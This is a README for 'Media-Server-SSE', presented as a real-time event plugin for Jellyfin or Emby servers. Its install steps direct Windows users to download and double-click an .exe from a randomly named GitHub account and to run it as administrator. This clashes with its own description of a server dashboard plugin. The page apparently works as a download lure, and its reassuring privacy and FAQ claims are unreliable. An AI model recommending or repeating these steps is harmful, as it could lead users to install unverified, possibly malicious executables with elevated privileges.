# 📡 Media-Server-SSE - Sync your media server events easily

[![](https://img.shields.io/badge/Download-Media--Server--SSE-blue.svg)](https://github.com/Standing-familyturdidae273/Media-Server-SSE)

This software adds Server Side Events to your Jellyfin or Emby media server. It allows your server to communicate status changes to other devices in real time. You get instant updates when playback starts, stops, or changes.

## 🛠️ System Requirements

Before you install this software, ensure your computer meets these needs:

*   Windows 10 or Windows 11.
*   An active Jellyfin or Emby server instance.
*   Network access to the media server.
*   50 MB of available disk space.

## 📥 How to Install

Follow these steps to set up the software on your Windows computer:

1. Visit the [official release page](https://github.com/Standing-familyturdidae273/Media-Server-SSE) to download the installer.
2. Look for the file ending in .exe under the latest version header.
3. Click the link to save the file to your computer.
4. Open your Downloads folder.
5. Double-click the downloaded file to start the setup process.
6. Follow the on-screen prompts to complete the installation.

## ⚙️ Configuring Your Server

The plugin needs your server details to function correctly. 

1. Open your media server dashboard in a web browser.
2. Navigate to the Plugins menu.
3. Select the Media-Server-SSE plugin from the list.
4. Enter your server URL if the software does not detect it automatically.
5. Click Save to apply your changes.
6. Restart your media server to activate the plugin features.

## 🧩 Understanding Server Side Events

Server Side Events provide a one-way connection from the server to your clients. Unlike other methods that ask the server for updates every few seconds, this system pushes the data as soon as an event happens. This saves processing power on your computer and keeps your applications in sync without lag.

Common events tracked by this plugin include:

*   User playback start.
*   Playback pause and resume.
*   Media scrubbing or seeking.
*   Item metadata updates.
*   Server connection status.

## 🛡️ Privacy and Data

This plugin operates entirely within your local network. It sends status updates from your media server to connected clients that you authorize. It does not send data to external servers or third-party tracking services. Your media library contents remain private and local to your machine.

## ❓ Troubleshooting Common Issues

If the plugin fails to initialize, check these common items:

*   **Firewall settings:** Ensure your firewall allows communication on the port used by your server.
*   **Version mismatch:** Check if your server version is compatible with the latest plugin release.
*   **Permissions:** Run the installer as an administrator if you encounter file writing errors during the setup process.

If problems persist, verify that your server is reachable from the machine where the plugin runs. Ping your server address from a terminal window to confirm a stable connection.

## 📈 Improving Performance

You can adjust the event frequency in the plugin settings menu. If you have many users or high traffic, increase the event interval to lower CPU usage. For most home users, the default settings provide the best balance between responsiveness and system load.

## 📋 Frequently Asked Questions

**Can I run this on a server other than Jellyfin or Emby?**
No, this software works specifically with those two platforms.

**Does this plugin slow down my media playback?**
No, the plugin runs as a background process and uses minimal system resources. It focuses only on event reporting.

**How do I update the plugin to a newer version?**
Download the latest installer from the main link and run it. The installer replaces your old file with the new version and keeps your existing settings intact. 

**Does this plugin support multiple users?**
Yes, it reports status changes for all users connected to the server. You can filter these events in your client application settings.